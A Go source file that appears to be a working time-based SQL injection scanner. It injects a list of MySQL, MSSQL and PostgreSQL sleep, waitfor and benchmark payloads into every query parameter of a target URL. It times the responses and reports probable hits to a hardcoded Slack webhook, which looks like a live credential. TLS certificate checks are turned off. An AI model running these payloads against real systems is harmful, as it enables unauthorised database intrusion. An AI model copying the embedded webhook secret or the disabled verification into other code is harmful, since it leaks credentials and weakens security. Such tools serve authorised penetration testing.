package main

import (
    "fmt"
    "os"
    "net/url"
    "net/http"
    "log"
    "net/http/httputil"
//    "io/ioutil"
//    "strings"
    "time"
    "crypto/tls"
//    "bufio"
    "bytes"
    "encoding/json"
    "errors"


)

type SlackRequestBody struct {
    Text string `json:"text"`
}

func SendSlackNotification(webhookUrl string, msg string) error {

    slackBody, _ := json.Marshal(SlackRequestBody{Text: msg})
    req, err := http.NewRequest(http.MethodPost, webhookUrl, bytes.NewBuffer(slackBody))
    if err != nil {
        return err
    }

    req.Header.Add("Content-Type", "application/json")

    client := &http.Client{Timeout: 10 * time.Second}
    resp, err := client.Do(req)
    if err != nil {
        return err
    }

    buf := new(bytes.Buffer)
    buf.ReadFrom(resp.Body)
    if buf.String() != "ok" {
        return errors.New("Non-ok response returned from Slack")
    }
    return nil
}

func sqli(url1,cookie1 string) {

         webhookUrl := "https://hooks.slack.com/services/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"        
         http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
         client := &http.Client{}
         req, err := http.NewRequest("GET",url1, nil)
         req.Header.Add("Cookie", cookie1)
         req.Header.Add("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
         req.Header.Add("Accept-Language","en-US,en;q=0.5")

         start := time.Now()
         res, err := client.Do(req)

         if err != nil{
               log.Fatal(err)
         }
         elapsed := time.Since(start).Seconds()
         fmt.Printf("http.Get to %s took %v seconds with status %z \n", url1, elapsed,res.StatusCode)
 
         requestDump, err := httputil.DumpRequest(req, true)
         if err != nil {
              fmt.Println(err)
         }
         fmt.Println(string(requestDump))
         fmt.Println(res.StatusCode)
         if elapsed >= 25 && elapsed <=27{
            req, err := http.NewRequest("GET",url1, nil)


            text:=fmt.Sprintf("probable Time Based SQLI on %s took %v seconds \n", url1, elapsed)
            SendSlackNotification(webhookUrl,text)
          

        }
//         reqBody, err := ioutil.ReadAll(res.Body)
//         if err != nil {
//                          log.Fatal(err)
//         }
//         fmt.Printf("%s", reqBody)


}

func main() {

               payloads := []string{" 'XOR(if(now()=sysdate(),sleep(25*1),0))OR'","sleep(25)#","1 or sleep(25)#","\" or sleep(25)#","' or sleep(25)#","\" or sleep(25)=\"", "' or sleep(25)='", "1) or sleep(25)#", "\") or sleep(25)=\"", "') or sleep(25)='", "1)) or sleep(25)#", "\")) or sleep(25)=\"", "')) or sleep(25)='", ";waitfor delay '0:0:25'--", ");waitfor delay '0:0:25'--", "';waitfor delay '0:0:25'--", "\";waitfor delay '0:0:25'--", "');waitfor delay '0:0:25'--", "\");waitfor delay '0:0:25'--", "));waitfor delay '0:0:25'--", "'));waitfor delay '0:0:25'--", "\"));waitfor delay '0:0:25'--", "benchmark(10000000,MD5(1))#", "1 or benchmark(10000000,MD5(1))#", "\" or benchmark(10000000,MD5(1))#", "' or benchmark(10000000,MD5(1))#", "1) or benchmark(10000000,MD5(1))#", "\") or benchmark(10000000,MD5(1))#", "') or benchmark(10000000,MD5(1))#", "1)) or benchmark(10000000,MD5(1))#","\")) or benchmark(10000000,MD5(1))#", "')) or benchmark(10000000,MD5(1))#", "pg_sleep(25)--", "1 or pg_sleep(25)--", "\" or pg_sleep(25)--", "' or pg_sleep(25)--", "1) or pg_sleep(25)--", "\") or pg_sleep(25)--", "') or pg_sleep(25)--", "1)) or pg_sleep(25)--", "\")) or pg_sleep(25)--", "')) or pg_sleep(25)--"}
               str := os.Args[1]
               cookie:=os.Args[2]
               u, _ := url.Parse(str)
               q, _ := url.ParseQuery(u.RawQuery)
               for _, payload := range payloads {
                     for key := range q {
                         q.Set(key,payload)
                     }
                     u.RawQuery = q.Encode()
                     l:=u.String()
                     if cookie == "1" {
                        sqli(l,"test")
                     }else{
                        sqli(l,cookie)
                     }
               }



}
